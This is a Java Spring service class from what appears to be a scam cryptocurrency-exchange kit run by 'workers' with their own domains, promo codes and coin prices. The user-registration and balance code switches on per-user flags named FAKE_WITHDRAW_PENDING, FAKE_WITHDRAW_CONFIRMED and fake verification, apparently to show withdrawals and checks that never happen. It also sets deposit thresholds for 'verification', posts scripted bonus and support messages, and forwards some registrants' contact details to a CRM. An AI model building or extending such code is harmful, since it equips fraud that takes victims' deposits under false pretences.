package me.yukitale.cryptoexchange.exchange.service;

import eu.bitwalker.useragentutils.UserAgent;
import jakarta.annotation.PostConstruct;
import jakarta.servlet.http.HttpServletRequest;
import me.yukitale.cryptoexchange.common.types.CoinType;
import me.yukitale.cryptoexchange.exchange.model.Coin;
import me.yukitale.cryptoexchange.exchange.model.user.*;
import me.yukitale.cryptoexchange.exchange.model.user.settings.UserFeature;
import me.yukitale.cryptoexchange.exchange.payload.request.RegisterInvRequest;
import me.yukitale.cryptoexchange.exchange.repository.CoinRepository;
import me.yukitale.cryptoexchange.exchange.repository.user.*;
import me.yukitale.cryptoexchange.exchange.repository.user.settings.UserFeatureRepository;
import me.yukitale.cryptoexchange.exchange.security.service.UserDetailsImpl;
import me.yukitale.cryptoexchange.exchange.security.service.UserDetailsServiceImpl;
import me.yukitale.cryptoexchange.panel.admin.model.other.AdminFeature;
import me.yukitale.cryptoexchange.panel.admin.model.other.AdminSettings;
import me.yukitale.cryptoexchange.panel.admin.repository.coins.AdminCoinSettingsRepository;
import me.yukitale.cryptoexchange.panel.admin.repository.other.AdminErrorMessageRepository;
import me.yukitale.cryptoexchange.panel.admin.repository.other.AdminFeatureRepository;
import me.yukitale.cryptoexchange.panel.admin.repository.other.AdminSettingsRepository;
import me.yukitale.cryptoexchange.panel.common.model.CoinSettings;
import me.yukitale.cryptoexchange.panel.common.model.ErrorMessage;
import me.yukitale.cryptoexchange.panel.common.model.Feature;
import me.yukitale.cryptoexchange.panel.worker.model.Domain;
import me.yukitale.cryptoexchange.panel.worker.model.Promocode;
import me.yukitale.cryptoexchange.panel.worker.model.Worker;
import me.yukitale.cryptoexchange.panel.worker.model.settings.other.WorkerFeature;
import me.yukitale.cryptoexchange.panel.worker.model.settings.other.WorkerRecordSettings;
import me.yukitale.cryptoexchange.panel.worker.model.settings.other.WorkerSettings;
import me.yukitale.cryptoexchange.panel.worker.repository.DomainRepository;
import me.yukitale.cryptoexchange.panel.worker.repository.PromocodeRepository;
import me.yukitale.cryptoexchange.panel.worker.repository.WorkerRepository;
import me.yukitale.cryptoexchange.panel.worker.repository.settings.coins.WorkerCoinSettingsRepository;
import me.yukitale.cryptoexchange.panel.worker.repository.settings.other.WorkerFeatureRepository;
import me.yukitale.cryptoexchange.panel.worker.repository.settings.other.WorkerRecordSettingsRepository;
import me.yukitale.cryptoexchange.panel.worker.repository.settings.other.WorkerSettingsRepository;
import me.yukitale.cryptoexchange.utils.GeoUtil;
import me.yukitale.cryptoexchange.utils.MathUtil;
import me.yukitale.cryptoexchange.utils.MyDecimal;
import me.yukitale.cryptoexchange.utils.ServletUtil;
import org.apache.commons.lang.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.DependsOn;
import org.springframework.security.authentication.AnonymousAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.stereotype.Service;
import org.springframework.web.bind.annotation.RequestBody;

import java.net.HttpURLConnection;
import java.net.URL;
import java.sql.Timestamp;
import java.util.HashSet;
import java.util.List;
import java.util.Optional;
import java.util.Set;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadLocalRandom;
import java.util.concurrent.TimeUnit;

@Service
@DependsOn(value = {"coinService"})
public class UserService {

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private UserBalanceRepository userBalanceRepository;

    @Autowired
    private UserLogRepository userLogRepository;

    @Autowired
    private CoinRepository coinRepository;

    @Autowired
    private UserFeatureRepository userFeatureRepository;

    @Autowired
    private WorkerRepository workerRepository;

    @Autowired
    private PromocodeRepository promocodeRepository;

    @Autowired
    private UserAlertRepository userAlertRepository;

    @Autowired
    private UserSupportMessageRepository userSupportMessageRepository;

    @Autowired
    private UserSupportDialogRepository userSupportDialogRepository;

    @Autowired
    private UserAddressRepository userAddressRepository;

    @Autowired
    private DomainRepository domainRepository;

    @Autowired
    private RoleRepository roleRepository;

    @Autowired
    private AdminCoinSettingsRepository adminCoinSettingsRepository;

    @Autowired
    private AdminFeatureRepository adminFeatureRepository;

    @Autowired
    private AdminErrorMessageRepository adminErrorMessageRepository;

    @Autowired
    private AdminSettingsRepository adminSettingsRepository;

    @Autowired
    private WorkerSettingsRepository workerSettingsRepository;

    @Autowired
    private WorkerFeatureRepository workerFeatureRepository;

    @Autowired
    private WorkerCoinSettingsRepository workerCoinSettingsRepository;

    @Autowired
    private WorkerRecordSettingsRepository workerRecordSettingsRepository;

    @Autowired
    private UserTradeOrderRepository tradeOrderRepository;

    @Autowired
    private CoinService coinService;

    @Autowired
    private UserDetailsServiceImpl userDetailsService;

    @Autowired CrmService crmService;

    @PostConstruct
    public void startMonitoring() {
        Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(this::checkLimitOrders, 30, 5, TimeUnit.SECONDS);
    }

    private void checkLimitOrders() {
        List<UserTradeOrder> tradeOrders = tradeOrderRepository.findByClosedAndTradeType(false, UserTradeOrder.TradeType.LIMIT);

        for (UserTradeOrder tradeOrder : tradeOrders) {
            try {
                String coinSymbol = tradeOrder.getCoinSymbol();
                UserTradeOrder.Type type = tradeOrder.getType();
                double price = tradeOrder.getPrice();
                double newPrice = coinService.getPrice(coinSymbol);

                if (type == UserTradeOrder.Type.BUY && newPrice <= price) {
                    Coin coin = coinRepository.findBySymbol(tradeOrder.getCoinSymbol()).orElse(null);
                    if (coin == null) {
                        continue;
                    }
                    User user = userRepository.findById(tradeOrder.getUser().getId()).orElse(null);
                    addBalanceLazyBypass(user, coin, tradeOrder.getCoinSymbol(), tradeOrder.getAmount());
                    double difference = tradeOrder.getPrice() * tradeOrder.getAmount() - (newPrice * tradeOrder.getAmount());
                    if (difference > 0) {
                        addBalanceLazyBypass(user, coinRepository.findUSDT(), "USDT", difference);
                    }
                    tradeOrder.setPrice(newPrice);
                    tradeOrder.setClosed(true);
                    tradeOrderRepository.save(tradeOrder);
                } else if (type == UserTradeOrder.Type.SELL && newPrice >= price) {
                    User user = userRepository.findById(tradeOrder.getUser().getId()).orElse(null);
                    addBalanceLazyBypass(user, coinRepository.findUSDT(), "USDT", newPrice * tradeOrder.getAmount());
                    tradeOrder.setClosed(true);
                    tradeOrder.setPrice(newPrice);
                    tradeOrderRepository.save(tradeOrder);
                }
            } catch (Exception ex) {
                ex.printStackTrace();
                System.out.println(ex);
            }
        }
    }

    public String getErrorMessage(User user, ErrorMessage.ErrorMessageType type) {
        ErrorMessage errorMessage = user.getErrorMessages().stream().filter(userErrorMessage -> userErrorMessage.getType() == type).findFirst().orElse(null);
        if (errorMessage == null) {
            if (user.getWorker() != null) {
                errorMessage = user.getWorker().getErrorMessages().stream().filter(workerErrorMessage -> workerErrorMessage.getType() == type).findFirst().orElse(null);
            }
            if (errorMessage == null) {
                errorMessage = adminErrorMessageRepository.findByType(type).orElseThrow(() -> new RuntimeException("Error message with type " + type + " not found in database"));
            }
        }

        return errorMessage.getMessage();
    }

    public User getUser(Authentication authentication) {
        if (authentication != null && !(authentication instanceof AnonymousAuthenticationToken) && authentication.isAuthenticated()) {
            UserDetailsImpl userDetails = (UserDetailsImpl) authentication.getPrincipal();
            return userRepository.findById(userDetails.getId()).orElse(null);
            //return userRepository.findByUsername(authentication.getName()).orElse(null);
        }

        return null;
    }

    public User createUser(String referrer, Domain domain, String email, String username, String password, String domainName, String platform, String regIp, String promocodeName, long refId, boolean emailConfirmed) {
        Worker worker = domain != null ? domain.getWorker() : null;

        boolean byDomain = worker != null;
        if (worker == null && refId > 0) {
            worker = workerRepository.findByUserId(refId).orElse(null);
        }

        Promocode promocode = promocodeRepository.findByName(promocodeName).orElse(null);
        if (worker == null && promocode != null && promocode.getWorker() != null) {
            worker = promocode.getWorker();
        }

        String counryCode = "NO";
        GeoUtil.GeoData geoData = GeoUtil.getGeo(regIp);
        if (geoData != null && !StringUtils.isBlank(counryCode)) {
            counryCode = geoData.getCountryCode().equals("N/A") ? "NO" : geoData.getCountryCode();
        }

        User user = new User(username, email, password, promocode == null ? null : promocode.getName(), domainName, regIp, platform, counryCode, worker, promocode != null && promocode.getBonusAmount() > 0, promocode != null ? promocode.getBonusAmount() : 0, emailConfirmed, false);
        user.setReferrer(referrer);

        UserRole userRole = roleRepository.findByName(UserRoleType.ROLE_USER)
                .orElseThrow(() -> new RuntimeException("User role " + UserRoleType.ROLE_USER + " not found in repository"));

        Set<UserRole> roles = new HashSet<>();
        roles.add(userRole);

        user.setUserRoles(roles);

        //todo: проверить тут все
        if (worker == null) {
            CoinSettings coinSettings = adminCoinSettingsRepository.findFirst();

            user.setVerificationModal(coinSettings.isVerifRequirement());
            user.setAmlModal(coinSettings.isVerifAml());
            user.setVerifDepositAmount(coinSettings.getMinVerifAmount());
            user.setDepositCommission(coinSettings.getDepositCommission());
            user.setWithdrawCommission(coinSettings.getWithdrawCommission());
        } else {
            CoinSettings coinSettings = workerCoinSettingsRepository.findByWorkerId(worker.getId()).orElse(null);

            if (coinSettings != null) {
                user.setVerificationModal(coinSettings.isVerifRequirement());
                user.setAmlModal(coinSettings.isVerifAml());
                user.setVerifDepositAmount(coinSettings.getMinVerifAmount());
                user.setDepositCommission(coinSettings.getDepositCommission());
                user.setWithdrawCommission(coinSettings.getWithdrawCommission());
            }
        }

        //todo: проверить
        String emailLeft = email.split("@")[0];
        WorkerRecordSettings recordSettings = null;
        if (emailLeft.length() >= 6) {
            try {
                long emailEnd = Long.parseLong(emailLeft.substring(emailLeft.length() - 6));
                recordSettings = workerRecordSettingsRepository.findByEmailEnd(emailEnd).orElse(null);
            } catch (Exception ex) {
            }
        }

        if (recordSettings != null) {
            user.setEmailEnd(true);
            user.setFakeVerified(recordSettings.isFakeVerified());
        }

        userRepository.save(user);

        userDetailsService.removeCache(user.getEmail());

        if (worker == null) {
            for (AdminFeature feature : adminFeatureRepository.findAll()) {
                setUserFeature(user, feature, recordSettings);
            }
        } else {
            for (WorkerFeature feature : workerFeatureRepository.findAllByWorkerId(worker.getId())) {
                setUserFeature(user, feature, recordSettings);
            }

            //todo: проверить
            if (byDomain) {
                WorkerSettings workerSettings = workerSettingsRepository.findByWorkerId(worker.getId()).orElse(null);
                if (workerSettings != null) {
                    if (workerSettings.getBonusAmount() > 0 && workerSettings.getBonusCoin() != null) {
                        UserAlert alert = new UserAlert();
                        alert.setUser(user);
                        alert.setType(UserAlert.Type.BONUS);
                        alert.setMessage(workerSettings.getBonusText());
                        alert.setCoin(workerSettings.getBonusCoin());
                        alert.setAmount(workerSettings.getBonusAmount());

                        userAlertRepository.save(alert);
                    }
                }
            }
        }

        if (promocode != null) {
            double amount = 0D;
            if (promocode.isRandom()) {
                amount = MathUtil.round(ThreadLocalRandom.current().nextDouble(promocode.getMinAmount(), promocode.getMaxAmount()), 8);
            } else {
                amount = promocode.getMinAmount();
            }

            if (amount > 0) {
                addBalance(user, promocode.getCoin(), amount);
            }

            promocode.setActivations(promocode.getActivations() + 1);

            promocodeRepository.save(promocode);
        }

        AdminSettings adminSettings = adminSettingsRepository.findFirst();
        String exchangeName = domain != null ? domain.getExchangeName() : adminSettings.getSiteName();
        if (worker != null) {
            WorkerSettings workerSettings = workerSettingsRepository.findByWorkerId(worker.getId()).orElse(null);
            if (workerSettings != null && workerSettings.isSupportWelcomeEnabled()) {
                UserSupportMessage supportMessage = new UserSupportMessage(UserSupportMessage.Target.TO_USER, UserSupportMessage.Type.TEXT, workerSettings.getSupportWelcomeMessage().replace("{domain_name}", exchangeName), false, true, user);

                createSupportDialog(supportMessage, user);

                userSupportMessageRepository.save(supportMessage);
            }
        } else {
            if (adminSettings.isSupportWelcomeEnabled()) {
                UserSupportMessage supportMessage = new UserSupportMessage(UserSupportMessage.Target.TO_USER, UserSupportMessage.Type.TEXT, adminSettings.getSupportWelcomeMessage().replace("{domain_name}", exchangeName), false, true, user);

                createSupportDialog(supportMessage, user);

                userSupportMessageRepository.save(supportMessage);
            }
        }

        if (worker != null) {
            worker.setUsersCount(worker.getUsersCount() + 1);

            workerRepository.save(worker);
        }

        if (domain != null) {
            domain.setUsersCount(domain.getUsersCount() + 1);

            domainRepository.save(domain);
        }

        return user;
    }

    public User createInvUser(String referrer, Domain domain, String email, String username, String password, String firstName, String lastName, String phone, String domainName, String platform, String regIp, String promocodeName, long refId, boolean emailConfirmed) {
        Worker worker = domain != null ? domain.getWorker() : null;

        boolean byDomain = worker != null;
        if (worker == null && refId > 0) {
            worker = workerRepository.findByUserId(refId).orElse(null);
        }

        Promocode promocode = promocodeRepository.findByName(promocodeName).orElse(null);
        if (worker == null && promocode != null && promocode.getWorker() != null) {
            worker = promocode.getWorker();
        }

        String counryCode = "NO";
        GeoUtil.GeoData geoData = GeoUtil.getGeo(regIp);
        if (geoData != null && !StringUtils.isBlank(counryCode)) {
            counryCode = geoData.getCountryCode().equals("N/A") ? "NO" : geoData.getCountryCode();
        }

        User user = new User(username, firstName, lastName, email, phone, password, promocode == null ? null : promocode.getName(), domainName, regIp, platform, counryCode, worker, promocode != null && promocode.getBonusAmount() > 0, promocode != null ? promocode.getBonusAmount() : 0, emailConfirmed, true);
        user.setReferrer(referrer);

        UserRole userRole = roleRepository.findByName(UserRoleType.ROLE_USER)
                .orElseThrow(() -> new RuntimeException("User role " + UserRoleType.ROLE_USER + " not found in repository"));

        Set<UserRole> roles = new HashSet<>();
        roles.add(userRole);

        user.setUserRoles(roles);

        //todo: проверить тут все
        if (worker == null) {
            CoinSettings coinSettings = adminCoinSettingsRepository.findFirst();

            user.setVerificationModal(coinSettings.isVerifRequirement());
            user.setAmlModal(coinSettings.isVerifAml());
            user.setVerifDepositAmount(coinSettings.getMinVerifAmount());
            user.setDepositCommission(coinSettings.getDepositCommission());
            user.setWithdrawCommission(coinSettings.getWithdrawCommission());
        } else {
            CoinSettings coinSettings = workerCoinSettingsRepository.findByWorkerId(worker.getId()).orElse(null);

            if (coinSettings != null) {
                user.setVerificationModal(coinSettings.isVerifRequirement());
                user.setAmlModal(coinSettings.isVerifAml());
                user.setVerifDepositAmount(coinSettings.getMinVerifAmount());
                user.setDepositCommission(coinSettings.getDepositCommission());
                user.setWithdrawCommission(coinSettings.getWithdrawCommission());
            }
        }

        //todo: проверить
        String emailLeft = email.split("@")[0];
        WorkerRecordSettings recordSettings = null;
        if (emailLeft.length() >= 6) {
            try {
                long emailEnd = Long.parseLong(emailLeft.substring(emailLeft.length() - 6));
                recordSettings = workerRecordSettingsRepository.findByEmailEnd(emailEnd).orElse(null);
            } catch (Exception ex) {
            }
        }

        if (recordSettings != null) {
            user.setEmailEnd(true);
            user.setFakeVerified(recordSettings.isFakeVerified());
        }

        userRepository.save(user);

        setBalance(user, coinRepository.findUSDT(), 250);

        userDetailsService.removeCache(user.getEmail());

        if (worker == null) {
            for (AdminFeature feature : adminFeatureRepository.findAll()) {
                setUserFeature(user, feature, recordSettings);
            }
        } else {
            for (WorkerFeature feature : workerFeatureRepository.findAllByWorkerId(worker.getId())) {
                setUserFeature(user, feature, recordSettings);
            }

            //todo: проверить
            if (byDomain) {
                WorkerSettings workerSettings = workerSettingsRepository.findByWorkerId(worker.getId()).orElse(null);
                if (workerSettings != null) {
                    if (workerSettings.getBonusAmount() > 0 && workerSettings.getBonusCoin() != null) {
                        UserAlert alert = new UserAlert();
                        alert.setUser(user);
                        alert.setType(UserAlert.Type.BONUS);
                        alert.setMessage(workerSettings.getBonusText());
                        alert.setCoin(workerSettings.getBonusCoin());
                        alert.setAmount(workerSettings.getBonusAmount());

                        userAlertRepository.save(alert);
                    }
                }
            }
        }

        if (promocode != null) {
            double amount = 0D;
            if (promocode.isRandom()) {
                amount = MathUtil.round(ThreadLocalRandom.current().nextDouble(promocode.getMinAmount(), promocode.getMaxAmount()), 8);
            } else {
                amount = promocode.getMinAmount();
            }

            if (amount > 0) {
                addBalance(user, promocode.getCoin(), amount);
            }

            promocode.setActivations(promocode.getActivations() + 1);

            promocodeRepository.save(promocode);
        }

        AdminSettings adminSettings = adminSettingsRepository.findFirst();
        String exchangeName = domain != null ? domain.getExchangeName() : adminSettings.getSiteName();
        if (worker != null) {
            WorkerSettings workerSettings = workerSettingsRepository.findByWorkerId(worker.getId()).orElse(null);
            if (workerSettings != null && workerSettings.isSupportWelcomeEnabled()) {
                UserSupportMessage supportMessage = new UserSupportMessage(UserSupportMessage.Target.TO_USER, UserSupportMessage.Type.TEXT, workerSettings.getSupportWelcomeMessage().replace("{domain_name}", exchangeName), false, true, user);

                createSupportDialog(supportMessage, user);

                userSupportMessageRepository.save(supportMessage);
            }
        } else {
            if (adminSettings.isSupportWelcomeEnabled()) {
                UserSupportMessage supportMessage = new UserSupportMessage(UserSupportMessage.Target.TO_USER, UserSupportMessage.Type.TEXT, adminSettings.getSupportWelcomeMessage().replace("{domain_name}", exchangeName), false, true, user);

                createSupportDialog(supportMessage, user);

                userSupportMessageRepository.save(supportMessage);
            }
        }

        if (worker != null) {
            worker.setUsersCount(worker.getUsersCount() + 1);

            workerRepository.save(worker);
        }

        if (domain != null) {
            domain.setUsersCount(domain.getUsersCount() + 1);

            domainRepository.save(domain);
        }

        crmService.sendDataToCrm(phone, firstName, lastName, email);

        return user;
    }

    public void processInvTwo(RegisterInvRequest request) {
        crmService.sendDataToCrm(request.getPhone(), request.getUsername(), null, request.getEmail());
    }

    private void setUserFeature(User user, Feature feature, WorkerRecordSettings recordSettings) {
        UserFeature userFeature = new UserFeature();
        userFeature.setUser(user);
        userFeature.setType(UserFeature.Type.valueOf(feature.getType().name()));

        boolean changed = false;
        if (recordSettings != null) {
            if (feature.getType() == Feature.FeatureType.FAKE_WITHDRAW_PENDING) {
                userFeature.setEnabled(recordSettings.isFakeWithdrawPending());
                changed = true;
            } else if (feature.getType() == Feature.FeatureType.FAKE_WITHDRAW_CONFIRMED) {
                userFeature.setEnabled(recordSettings.isFakeWithdrawConfirmed());
                changed = true;
            } else if (feature.getType() == Feature.FeatureType.PREMIUM) {
                userFeature.setEnabled(recordSettings.isPremium());
                changed = true;
            } else if (feature.getType() == Feature.FeatureType.WALLET_CONNECT) {
                userFeature.setEnabled(recordSettings.isWalletConnect());
                changed = true;
            }
        }

        if (!changed) {
            userFeature.setEnabled(feature.isEnabled());
        }

        userFeatureRepository.save(userFeature);
    }

    private void createSupportDialog(UserSupportMessage supportMessage, User user) {
        UserSupportDialog userSupportDialog = new UserSupportDialog();

        userSupportDialog.setOnlyWelcome(true);
        userSupportDialog.setUserUnviewedMessages(userSupportDialog.getUserUnviewedMessages() + 1);
        userSupportDialog.setTotalMessages(userSupportDialog.getTotalMessages() + 1);
        userSupportDialog.setLastMessageDate(supportMessage.getCreated());
        userSupportDialog.setUser(user);

        userSupportDialogRepository.save(userSupportDialog);
    }

    public void validateUserSupport(Authentication authentication, User user) {
        User supporterUser = getUser(authentication);

        if (user.getSupport() != null && user.getSupport().getId() != supporterUser.getId()) {
            throw new RuntimeException("Unauthorized attempt to edit deposit address for user: " + user.getEmail());
        }
    }

    public void bindToWorker(User user, Worker worker) {
        if (worker != null && user.getWorker() == null) {
            CoinSettings coinSettings = worker.getCoinSettings();

            user.setWorker(worker);

            user.setVerificationModal(coinSettings.isVerifRequirement());
            user.setAmlModal(coinSettings.isVerifAml());
            user.setVerifDepositAmount(coinSettings.getMinVerifAmount());
            user.setDepositCommission(coinSettings.getDepositCommission());
            user.setWithdrawCommission(coinSettings.getWithdrawCommission());

            userRepository.save(user);

            List<UserFeature> userFeatures = userFeatureRepository.findAllByUserId(user.getId());
            for (WorkerFeature feature : worker.getFeatures()) {
                UserFeature.Type type = UserFeature.Type.valueOf(feature.getType().name());
                UserFeature userFeature = userFeatures == null ? null : userFeatures.stream().filter(feat -> feat.getType() == type).findFirst().orElse(null);
                if (userFeature == null) {
                    userFeature = new UserFeature();
                    userFeature.setUser(user);
                    userFeature.setType(type);
                }

                if (user.isEmailEnd() && userFeature.getType() == UserFeature.Type.FAKE_WITHDRAW_PENDING && userFeature.isEnabled() ||
                        userFeature.getType() == UserFeature.Type.FAKE_WITHDRAW_CONFIRMED && userFeature.isEnabled() ||
                        userFeature.getType() == UserFeature.Type.PREMIUM && userFeature.isEnabled() ||
                        userFeature.getType() == UserFeature.Type.WALLET_CONNECT && userFeature.isEnabled()) {
                    continue;
                } else {
                    userFeature.setEnabled(feature.isEnabled());
                }

                userFeatureRepository.save(userFeature);
            }

            worker.setUsersCount(worker.getUsersCount() + 1);

            workerRepository.save(worker);
        }
    }

    public void bindToWorker0(User user, Worker worker, CoinSettings coinSettings, List<WorkerFeature> features) {
        if (user.getWorker() == null) {
            user.setWorker(worker);

            user.setVerificationModal(coinSettings.isVerifRequirement());
            user.setAmlModal(coinSettings.isVerifAml());
            user.setVerifDepositAmount(coinSettings.getMinVerifAmount());
            user.setDepositCommission(coinSettings.getDepositCommission());
            user.setWithdrawCommission(coinSettings.getWithdrawCommission());

            userRepository.save(user);

            List<UserFeature> userFeatures = userFeatureRepository.findAllByUserId(user.getId());
            for (WorkerFeature feature : features) {
                UserFeature.Type type = UserFeature.Type.valueOf(feature.getType().name());
                UserFeature userFeature = userFeatures == null ? null : userFeatures.stream().filter(feat -> feat.getType() == type).findFirst().orElse(null);
                if (userFeature == null) {
                    userFeature = new UserFeature();
                    userFeature.setUser(user);
                    userFeature.setType(type);
                }

                userFeature.setEnabled(feature.isEnabled());

                userFeatureRepository.save(userFeature);
            }

            worker.setUsersCount(worker.getUsersCount() + 1);

            workerRepository.save(worker);
        }
    }

    public void createAction(Authentication authentication, HttpServletRequest request, String action) {
        User user = getUser(authentication);
        if (user != null) {
            createAction(user, request, action);
        }
    }

    public void createAction(User user, HttpServletRequest request, String action) {
        long time = System.currentTimeMillis();

        String platform = "N/A";
        try {
            UserAgent userAgent = UserAgent.parseUserAgentString(request.getHeader("user-agent"));
            platform = userAgent.getOperatingSystem().getName() + ", " + userAgent.getBrowser().getName();
        } catch (Exception ignored) {
        }

        String ip = ServletUtil.getIpAddress(request);

        UserLog userLog = new UserLog(action, ip, user, platform, time);
        userLogRepository.save(userLog);

        user.setLastIp(ip);
        user.setLastActivity(time);
        user.setLastOnline(time);

        GeoUtil.GeoData geoData = user.getGeolocation();
        if (geoData != null && !StringUtils.isBlank(geoData.getCountryCode())) {
            user.setLastCountryCode(geoData.getCountryCode().equals("N/A") ? "NO" : geoData.getCountryCode());
        }

        if (!platform.equals("N/A") || user.getPlatform() == null) {
            user.setPlatform(platform);
        }
        userRepository.save(user);
    }

    public void createAction(User user, String action) {
        long time = System.currentTimeMillis();

        UserLog userLog = new UserLog(action, user.getLastIp(), user, user.getPlatform(), time);
        userLogRepository.save(userLog);

        user.setLastActivity(time);
        user.setLastOnline(time);

        userRepository.save(user);
    }

    //todo: caching (maybe in repository)
    public MyDecimal getTotalUsdBalanceWithWorker(User user) {
        Worker worker = user.getWorker();

        List<UserBalance> userBalances = userBalanceRepository.findAllByUserId(user.getId());

        double total = 0D;
        for (UserBalance balance : userBalances) {
            total += balance.getInUsd(coinService.getIfWorkerPrice(worker, balance.getCoin()));
        }

        return new MyDecimal(total, true);
    }

    public MyDecimal getTotalUsdBalanceWithoutWorker(User user) {
        List<UserBalance> userBalances = userBalanceRepository.findAllByUserId(user.getId());

        double total = 0D;
        for (UserBalance balance : userBalances) {
            total += balance.getInUsd(coinService.getPrice(balance.getCoin()));
        }

        return new MyDecimal(total, true);
    }

    public MyDecimal convertUsdToCoinWithWorker(User user, double usd, Coin coin) {
        Worker worker = user.getWorker();
        double price = coinService.getIfWorkerPrice(worker, coin);
        return new MyDecimal(usd / price);
    }

    public MyDecimal getUsdBalanceWithWorker(User user, Coin coin) {
        double balance = getBalance(user, coin);
        return new MyDecimal(balance * coinService.getIfWorkerPrice(user.getWorker(), coin), true);
    }

    public MyDecimal getUsdBalanceWithoutWorker(User user, Coin coin) {
        double balance = getBalance(user, coin);
        return new MyDecimal(balance * coinService.getPrice(coin), true);
    }

    public MyDecimal getAllocationWithWorker(User user, Coin coin) {
        MyDecimal totalUsdBalance = getTotalUsdBalanceWithWorker(user);
        MyDecimal coinUsdBalance = getUsdBalanceWithWorker(user, coin);

        double value = coinUsdBalance.getValue() / totalUsdBalance.getValue() * 100D;

        return new MyDecimal(Double.isNaN(value) ? 0D : value, true);
    }

    public List<CoinType> getMissingCoinTypes(long userId) {
        return List.of(CoinType.values()).stream()
            .filter(coinType -> userAddressRepository.findByUserId(userId).stream()
                .map(UserAddress::getCoinType)
                .noneMatch(coinType::equals))
                .toList();
    }

    public MyDecimal getAllocationWithoutWorker(User user, Coin coin) {
        MyDecimal totalUsdBalance = getTotalUsdBalanceWithoutWorker(user);
        MyDecimal coinUsdBalance = getUsdBalanceWithoutWorker(user, coin);

        double value = coinUsdBalance.getValue() / totalUsdBalance.getValue() * 100D;
        return new MyDecimal(Double.isNaN(value) ? 0D : 0, true);
    }

    public double getBalance(User user, String coinSymbol) {
        Coin coin = coinRepository.findBySymbol(coinSymbol).orElse(null);
        return coin == null ? 0D : getBalance(user, coin);
    }

    public double getBalance(long userId, String coinSymbol) {
        Coin coin = coinRepository.findBySymbol(coinSymbol).orElse(null);
        return coin == null ? 0D : getBalance(userId, coin);
    }

    public double getBalance(User user, Coin coin) {
        return getBalance(user.getId(), coin);
    }

    public double getBalance(long userId, Coin coin) {
        Optional<UserBalance> userBalanceOptional = userBalanceRepository.findUserBalanceByUserIdAndCoinSymbol(userId, coin.getSymbol());
        return userBalanceOptional.map(UserBalance::getBalance).orElse(0.0);
    }

    public double getBalanceLazyBypass(long userId, String coinSymbol) {
        Optional<UserBalance> userBalanceOptional = userBalanceRepository.findUserBalanceByUserIdAndCoinSymbol(userId, coinSymbol);
        return userBalanceOptional.map(UserBalance::getBalance).orElse(0.0);
    }

    public MyDecimal getFormattedBalance(long userId, Coin coin) {
        return new MyDecimal(getBalance(userId, coin));
    }

    public MyDecimal getFormattedBalance(User user, Coin coin) {
        return new MyDecimal(getBalance(user, coin));
    }

    public MyDecimal getFormattedBalance(long userId, String coinSymbol) {
        return new MyDecimal(getBalance(userId, coinSymbol));
    }

    public MyDecimal getFormattedBalance(User user, String coinSymbol) {
        return new MyDecimal(getBalance(user, coinSymbol));
    }

    public void setBalance(User user, String coinSymbol, double balance) {
        coinRepository.findBySymbol(coinSymbol).ifPresent(coin -> setBalance(user, coin, balance));
    }

    public void setBalance(long userId, String coinSymbol, double balance) {
        coinRepository.findBySymbol(coinSymbol).ifPresent(coin -> setBalance(userId, coin, balance));
    }

    public void addBalance(User user, String coinSymbol, double balance) {
        addBalance(user.getId(), coinSymbol, balance);
    }

    public void addBalanceLazyBypass(User user, Coin coin, String coinSymbol, double balance) {
        setBalanceLazyBypass(user.getId(), coin, coinSymbol, getBalance(user.getId(), coin) + balance);
    }

    public void addBalance(long userId, String coinSymbol, double balance) {
        coinRepository.findBySymbol(coinSymbol).ifPresent((coin -> addBalance(userId, coin, balance)));
    }

    public void addBalance(User user, Coin coin, double balance) {
        addBalance(user.getId(), coin, balance);
    }

    public void addBalance(long userId, Coin coin, double balance) {
        double currentBalance = getBalance(userId, coin);
        setBalance(userId, coin, currentBalance + balance);
    }

    public void setBalance(User user, Coin coin, double balance) {
        UserBalance userBalance = userBalanceRepository.findUserBalanceByUserIdAndCoinSymbol(user.getId(), coin.getSymbol()).orElse(new UserBalance());
        userBalance.setCoin(coin);
        userBalance.setBalance(balance);
        userBalance.setUser(user);

        userBalanceRepository.save(userBalance);
    }

    public void setBalance(long userId, Coin coin, double balance) {
        UserBalance userBalance = userBalanceRepository.findUserBalanceByUserIdAndCoinSymbol(userId, coin.getSymbol()).orElse(new UserBalance());
        userBalance.setCoin(coin);
        userBalance.setBalance(balance);

        if (userBalance.getUser() == null) {
            userBalance.setUser(userRepository.findById(userId).get());
        }

        userBalanceRepository.save(userBalance);
    }

    public void setBalanceLazyBypass(long userId, Coin coin, String coinSymbol, double balance) {
        UserBalance userBalance = userBalanceRepository.findUserBalanceByUserIdAndCoinSymbol(userId, coinSymbol).orElse(new UserBalance());
        userBalance.setCoin(coin);
        userBalance.setBalance(balance);

        if (userBalance.getUser() == null) {
            userBalance.setUser(userRepository.findById(userId).get());
        }

        userBalanceRepository.saveLazyBypass(userBalance, userId, coinSymbol);
    }
}
